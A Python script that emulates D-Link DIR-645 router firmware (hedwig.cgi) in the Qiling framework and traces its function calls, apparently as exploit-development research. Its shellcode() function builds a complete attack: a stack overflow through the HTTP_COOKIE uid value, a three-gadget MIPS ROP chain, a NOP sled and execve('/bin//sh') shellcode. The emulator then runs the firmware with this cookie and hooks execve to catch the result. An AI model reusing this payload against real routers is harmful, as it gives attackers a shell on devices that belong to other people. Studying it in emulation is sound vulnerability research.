import sys
sys.path.append("..")
from qiling import *
from qiling.const import *
from qiling.os.const import *
from qiling.extensions import trace
from unicorn import *
from capstone import *
from pwnlib.elf import *
from struct import pack

md = Cs(CS_ARCH_MIPS, CS_MODE_32 + CS_MODE_LITTLE_ENDIAN)

#! IMPORTANT: enable detail mode for capstone, otherwise can not get operands of inst
md.detail = True

MAIN_ADDR = 0x0402770
HEDWIGCGI_MAIN = 0x0040bfc0
HEDWIGCGI_MAIN_END = 0x0040c594
SESS_GET_UID = 0x004083f0
SLEEP_ADDR = 0

MIPS_FORK_SYSCALL = 0xfa2
MIPS_EXECVE_SYSCALL = 0xfab

# We should get mapinfo after the binary is loaded
def parse_mapinfo(ql: Qiling):
    mapinfo = []
    for info in ql.mem.get_mapinfo():
        mapinfo.append({
            "start": info[0],
            "end": info[1],
            "perm": info[2],
            "label": info[3],
            "path": info[4]
        })
    return mapinfo

def create_symbol_map(path: str, libc_base = None, pie_base = None):
    elf = ELF(path)
    addrsym_map = {}
    for sym in elf.symbols:
        # for no-pie elf
        if not libc_base and not pie_base:
            addrsym_map[elf.symbols[sym]] = sym

        # for PIE executable
        elif pie_base and not libc_base:
            addrsym_map[elf.symbols[sym] + pie_base] = sym

        # for libc symbols
        elif libc_base and not pie_base:
            addrsym_map[elf.symbols[sym] + libc_base] = sym

        else:
            raise Exception("Invalid parameters")
    return addrsym_map, elf.symbols


def if_external_addr(ql: Qiling, addr: int, pie_base = None):
    try:
        lib_addr_min = min(lib_maps[lib_name]["base"] for lib_name in lib_maps)

        if addr >= lib_addr_min:
            return True
        else:
            return False

    # `main` function has not arrived, just return False
    except Exception as e:
        return True

def resolve_addr2sym(ql: Qiling, addr: int):
    # find symbol in executable
    for s_addr in exeu_addrsym_map.keys():
        if addr == s_addr:
            return exeu_addrsym_map[s_addr]
    
    # find symbol in lib
    for lib_name in lib_maps:
        lib_map = lib_maps[lib_name]
        for s_addr in lib_map["addrsym_map"].keys():
            if addr == s_addr:
                return lib_map["addrsym_map"][s_addr]
    
    ql.log.warning(f"Can not find symbol for address: {hex(addr)}")
    return "?"

def resolve_sym2addr(sym: str, libname: str = None):
    """
    * libname: `ld-uClibc.so.0`, `libgcc_s.so.1`, `libuClibc-0.9.30.1.so`
    """
    if libname:
        offset = lib_maps[libname]["symaddr_map"][sym]
        base = lib_maps[libname]["base"]
        print(f"lib base: {hex(base)}")
        return base + offset
    else:
        # TODO: 
        pass
    
def trace_report(inst: CsInsn, callee_name: str):
    global last_report
    
    trival_functions = [
        "_dl_runtime_resolve"
    ]
    
    if callee_name in trival_functions:
        return

    if last_report == {}:
        last_report["callee"] = callee_name
        last_report["count"] = 1
        last_report["log"] = f"{hex(inst.address)}: {inst.mnemonic} -> {callee_name}"
        print(last_report["log"])
        print("\tcount: %d" % (last_report["count"]))
        return
    
    if last_report["callee"] == callee_name:
        last_report["count"] += 1
    else:
        print(last_report["log"])
        print("\tcount: %d" % (last_report["count"]))

        last_report["callee"] = callee_name
        last_report["count"] = 1
        last_report["log"] = f"{hex(inst.address)}: {inst.mnemonic} -> {callee_name}"

    return

def trace_callback(ql: Qiling, trace_externl_func = False):

    def __trace_hook(ql: Qiling, address: int, size: int):
        # [internal] Trace hook callback.
         # if `address` is already hooked by another hook, just fill the nop
        if address in ql._addr_hook:
            buf = b'\x00' * size    # `nop` in mips
        else:
            buf = ql.mem.read(address, size)

        insts = []
        for inst in md.disasm(buf, address):
            insts.append(inst)

        assert len(insts) == 1
        inst: CsInsn = insts[0]

        address = inst.address
        mnemonic = inst.mnemonic
        
        # find the `jalr $t9`, which is the function call in mips
        if mnemonic == "jalr":
            
            # if current inst's address is in external lib, just return
            if not trace_externl_func:
                if if_external_addr(ql, address):
                    return
            
            call_target_op = inst.operands[0]
            assert call_target_op.type == CS_OP_REG
            call_target_reg_name = inst.reg_name(call_target_op.reg)
            assert call_target_reg_name == "t9"
            call_target = ql.arch.regs.read(call_target_reg_name)
            trace_report(inst, resolve_addr2sym(ql, call_target))
        
        elif mnemonic == "jal":
            trace_report(inst, inst.op_str)

    ql.hook_code(__trace_hook)

# in qiling framework, sleep is in 0x90092bd0
def shellcode():
    # execve shellcode translated from MIPS to MIPSEL
    # http://shell-storm.org/shellcode/files/shellcode-792.php
    # Taken from: https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/
    
    shellcode = b""
    shellcode += b"\xff\xff\x06\x28" # slti $a2, $zero, -1
    shellcode += b"\x62\x69\x0f\x3c" # lui $t7, 0x6962
    shellcode += b"\x2f\x2f\xef\x35" # ori $t7, $t7, 0x2f2f
    shellcode += b"\xf4\xff\xaf\xaf" # sw $t7, -0xc($sp)
    shellcode += b"\x73\x68\x0e\x3c" # lui $t6, 0x6873
    shellcode += b"\x6e\x2f\xce\x35" # ori $t6, $t6, 0x2f6e
    shellcode += b"\xf8\xff\xae\xaf" # sw $t6, -8($sp)
    shellcode += b"\xfc\xff\xa0\xaf" # sw $zero, -4($sp)
    shellcode += b"\xf4\xff\xa4\x27" # addiu $a0, $sp, -0xc
    shellcode += b"\xff\xff\x05\x28" # slti $a1, $zero, -1
    shellcode += b"\xab\x0f\x02\x24" # addiu;$v0, $zero, 0xfab
    shellcode += b"\x0c\x01\x01\x01" # syscall 0x40404\

    LIB_BASE = 0x9003c000
    SLEEP_ADDR = 0x90092bd0

    # buffer = b"uid=%s" % ("A" * 1043)
    # buffer += p32(ret_addr)   # will be stored in $ra
    """
    |   $ra -> padding 1043 + p32  
    |   $s8 -> padding 1039 + p32
    |   $s7 -> padding 1035 + p32
    |   $s6 -> padding 1031 + p32
    |   $s5 -> ...
    |   $s4
    |   $s3
    |   $s2
    |   $s1
    |   $s0
    """

    # Following gadgets are copied from ghidra, which base address is 0x10000
    # when contructing the ROP chain, true address should be subtracted by 0x10000

    # first gadget, overwrite the $ra, and execute the `sleep` function
    # after sleep function is called, we should also control the contol flow
    # Gadget 1 (calls sleep(3) and jumps to  $s5)
    #
    # 0003bc94 03 00 04 24            li         a0,0x3  ; Argument for sleep
    # 0003bc98 21 c8 c0 03            move       t9,s8   ; s8 -> sleep()
    # 0003bc9c 09 f8 20 03            jalr       t9
    # 0003bca0 21 30 00 00            _clear     a2
    # 0003bca4 21 28 80 02            move       a1,s4
    # 0003bca8 0e 00 04 24            li         a0,0xe
    # 0003bcac 21 c8 a0 02            move       t9,s5   ; s5 -> Address of Gadget #2
    # 0003bcb0 09 f8 20 03            jalr       t9
    # 0003bcb4 21 30 00 00            _clear     a2
    
    # Gadget 2 (Adjusts $sp and puts stack addess (shellcode) in $s1)
    #
    # 0004dcb4 28 00 b1 27            addiu      s1,sp,0x28 ; s1 -> Address of shellcode    
    # 0004dcb8 21 20 60 02            move       a0,s3
    # 0004dcbc 21 28 20 02            move       a1,s1
    # 0004dcc0 21 c8 00 02            move       t9,s0  ; s0 -> Address of Gadget #3
    # 0004dcc4 09 f8 20 03            jalr       t9
    # 0004dcc8 01 00 06 24            _li        __name,0x1

    # Gadget 3 (jumps to $s1 -> Stack)
    # 0001bb44 21 c8 20 02            move       t9,s1
    # 0001bb48 09 f8 20 03            jalr       t9
    # 0001bb4c 03 00 04 24            _li        __size,0x3

    # so register $s0 -> Gadget 3, $s5 -> Gadget 2, $s8 -> sleep should be set
    # and address of shellcode should be set into $sp + 0x28
    buffer = b"uid=%s" % (b"B" * 1007)
    buffer += pack("<I", LIB_BASE + 0x0001bb44 - 0x10000)
    buffer += b"s1s1"
    buffer += b"s2s2"
    buffer += b"s3s3"
    buffer += b"s4s4"
    buffer += pack("<I", LIB_BASE + 0x0004dcb4 - 0x10000)
    buffer += b"s6s6"
    buffer += b"s7s7"
    buffer += pack("<I", SLEEP_ADDR)
    buffer += pack("<I", LIB_BASE + 0x0003bc94 - 0x10000)

    # b"\x26\x40\x08\x01" -> NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
    buffer += b"\x26\x40\x08\x01" * 30 + shellcode
    
    return buffer


def main_hook(ql: Qiling):
    ql.log.warning("** At [main] **")

    # init the mapinfo
    formated_map_info = parse_mapinfo(ql)

    # get the executable symbol map
    global exeu_addrsym_map
    exeu_addrsym_map, exeu_sym2addr_map = create_symbol_map(binary_path)

    # get the lib path and lib base address
    global lib_maps
    lib_set = set()

    for mapinfo in formated_map_info:
        # ld is excluded by following condition
        if ("lib" in mapinfo["label"] and "[mmap]" in mapinfo["label"]) or ("ld-uClibc" in mapinfo["label"]):
            lib_name = mapinfo["label"].replace("[mmap]", "").strip()
            lib_path = rootfs + "/lib" + "/" + lib_name
            lib_set.add((lib_name, lib_path, ql.mem.get_lib_base(lib_name)))
    
    for lib in lib_set:
        lib_name = lib[0]
        addr2sym_map, sym2addr_map = create_symbol_map(lib[1], lib[2])
        lib_maps[lib_name] = {
            "path": lib[1],
            "base": lib[2],
            "addrsym_map": addr2sym_map,
            "symaddr_map": sym2addr_map
        }

    SLEEP_ADDR = resolve_sym2addr("sleep", libname = "libuClibc-0.9.30.1.so")
    ql.log.warning(f"sleep addr: {hex(SLEEP_ADDR)}")

def my_sandbox(path, rootfs):

    def execve_onenter(ql, pathname, argv, envp, *args):
        ql.log.warning("at execve_onenter")

    def strcpy_hook(ql: Qiling):
        param_dict = {
            "dst": POINTER,
            "src": STRING
        }
        params = ql.os.resolve_fcall_params(param_dict)
        
        print("dst: %s" % (hex(params["dst"])))
        print("src: %s" % (params["src"]))

        return 1

    # http_cookie = b"uid=%s" % (b"A" * 1070)
    http_cookie = shellcode()

    #! IMPORTANT: shit, qiling does not support bytes, so i patched `__push_str` in qiling framework
    required_env = {
        b"REQUEST_METHOD": b"POST",
        b"HTTP_COOKIE": http_cookie
    }

    ql = Qiling(path, rootfs, env = required_env)
    ql.add_fs_mapper('/tmp', '/var/tmp')        # Maps hosts /tmp to /var/tmp
    ql.hook_address(main_hook, MAIN_ADDR)
    ql.hook_address(lambda ql: ql.log.warning("** At [hedwigcgi_main] **"), HEDWIGCGI_MAIN)
    ql.hook_address(lambda ql: ql.log.warning("** At [sess_get_uid] **"), SESS_GET_UID)


    # ql.hook_address(hook_sess_get_uid, SESS_GET_UID)
    ql.os.set_api("strcpy", strcpy_hook, QL_INTERCEPT.ENTER)

    # ql.debugger = True

    ql.os.set_syscall(MIPS_EXECVE_SYSCALL, execve_onenter, QL_INTERCEPT.ENTER)

    trace_callback(ql, trace_externl_func = False)

    ql.log.setLevel("WARNING")
    ql.run()

if __name__ == "__main__":
    binary_path = "_DIR645A1_FW103RUB08.bin.extracted/squashfs-root/htdocs/hedwig.cgi"
    rootfs = "_DIR645A1_FW103RUB08.bin.extracted/squashfs-root"

    exeu_addrsym_map = {}
    lib_maps = {}

    last_report = {}

    try:
        my_sandbox([binary_path], rootfs)
    except Exception as e:
        print(e)

    #! Print the last report
    print(last_report["log"])
    print("\tcount: %d" % (last_report["count"]))